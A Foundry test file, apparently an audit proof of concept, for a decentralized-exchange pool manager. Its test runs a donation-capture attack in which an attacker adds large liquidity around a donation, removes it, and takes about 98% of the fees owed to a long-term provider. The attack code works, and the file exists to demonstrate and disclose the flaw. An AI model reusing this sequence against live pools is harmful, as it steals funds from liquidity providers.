// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {IHooks} from "../src/interfaces/IHooks.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {PoolModifyLiquidityTest} from "../src/test/PoolModifyLiquidityTest.sol";
import {PoolDonateTest} from "../src/test/PoolDonateTest.sol";
import {SortTokens} from "./utils/SortTokens.sol";
import {Deployers} from "./utils/Deployers.sol";
import {Currency} from "../src/types/Currency.sol";

contract ExploitDonationCaptureTest is Test, Deployers {
    address internal attacker = makeAddr("attacker");
    address internal donor = makeAddr("donor");
    address internal victim = makeAddr("victim");

    PoolModifyLiquidityTest internal attackerRouter;
    PoolModifyLiquidityTest internal victimRouter;

    PoolKey internal poolKey;
    MockERC20 internal token0;
    MockERC20 internal token1;

    function setUp() public {
        // fresh manager without pre-funded liquidity
        deployFreshManager();

        attackerRouter = new PoolModifyLiquidityTest(manager);
        victimRouter = new PoolModifyLiquidityTest(manager);
        donateRouter = new PoolDonateTest(manager);

        // deploy and sort tokens
        MockERC20[] memory tokens = deployTokens(2, 1e30);
        (currency0, currency1) = SortTokens.sort(tokens[0], tokens[1]);
        token0 = MockERC20(Currency.unwrap(currency0));
        token1 = MockERC20(Currency.unwrap(currency1));

        // initialize pool at 1:1 price with standard spacing
        poolKey = PoolKey(currency0, currency1, 3000, 60, IHooks(address(0)));
        manager.initialize(poolKey, SQRT_PRICE_1_1);

        // distribute funds to actors
        token0.transfer(attacker, 5e26);
        token1.transfer(attacker, 5e26);
        token0.transfer(victim, 5e24);
        token1.transfer(victim, 5e24);
        token0.transfer(donor, 1e24);

        // approvals for routers
        vm.startPrank(attacker);
        token0.approve(address(attackerRouter), type(uint256).max);
        token1.approve(address(attackerRouter), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        token0.approve(address(victimRouter), type(uint256).max);
        token1.approve(address(victimRouter), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(donor);
        token0.approve(address(donateRouter), type(uint256).max);
        token1.approve(address(donateRouter), type(uint256).max);
        vm.stopPrank();
    }

    function testExploit_LOGIC001_DonationCapture() public {
        // Victim provides long-term liquidity
        ModifyLiquidityParams memory baseLiquidity =
            ModifyLiquidityParams({tickLower: -120, tickUpper: 120, liquidityDelta: 1e18, salt: 0});
        uint256 victimBalanceStart = token0.balanceOf(victim);
        vm.prank(victim);
        victimRouter.modifyLiquidity(poolKey, baseLiquidity, ZERO_BYTES);

        // Attacker flash-provides outsized liquidity to dominate fee growth
        int256 attackerLiquidityDelta = 50e18; // ~98% of active liquidity after adding
        ModifyLiquidityParams memory attackerAdd =
            ModifyLiquidityParams({tickLower: -120, tickUpper: 120, liquidityDelta: attackerLiquidityDelta, salt: 0});
        uint256 attackerBalanceBefore = token0.balanceOf(attacker);
        vm.prank(attacker);
        attackerRouter.modifyLiquidity(poolKey, attackerAdd, ZERO_BYTES);

        // Third party donates fees intended for passive LPs
        uint256 donationAmount = 1_000_000e18;
        vm.prank(donor);
        donateRouter.donate(poolKey, donationAmount, 0, ZERO_BYTES);

        // Attacker removes temporary liquidity, capturing almost all donated fees
        ModifyLiquidityParams memory attackerRemove = ModifyLiquidityParams({
            tickLower: -120,
            tickUpper: 120,
            liquidityDelta: -attackerLiquidityDelta,
            salt: 0
        });
        vm.prank(attacker);
        attackerRouter.modifyLiquidity(poolKey, attackerRemove, ZERO_BYTES);
        uint256 attackerBalanceAfter = token0.balanceOf(attacker);

        // Long-term LP withdraws and only receives a sliver of the donation
        ModifyLiquidityParams memory victimRemove =
            ModifyLiquidityParams({tickLower: -120, tickUpper: 120, liquidityDelta: -1e18, salt: 0});
        vm.prank(victim);
        victimRouter.modifyLiquidity(poolKey, victimRemove, ZERO_BYTES);
        uint256 victimBalanceAfter = token0.balanceOf(victim);

        uint256 attackerProfit = attackerBalanceAfter - attackerBalanceBefore;
        uint256 victimProfit = victimBalanceAfter - victimBalanceStart;

        emit log_named_uint("attacker profit from donation", attackerProfit);
        emit log_named_uint("victim profit from donation", victimProfit);

        // Attacker captures ~98% of the donated amount, demonstrating donation hijack
        assertGt(attackerProfit, donationAmount * 95 / 100, "attacker failed to capture majority of donation");
        assertLt(victimProfit, donationAmount / 50, "victim should only receive a tiny share");
        assertApproxEqAbs(attackerProfit + victimProfit, donationAmount, 10, "fees should sum to donation");
    }
}

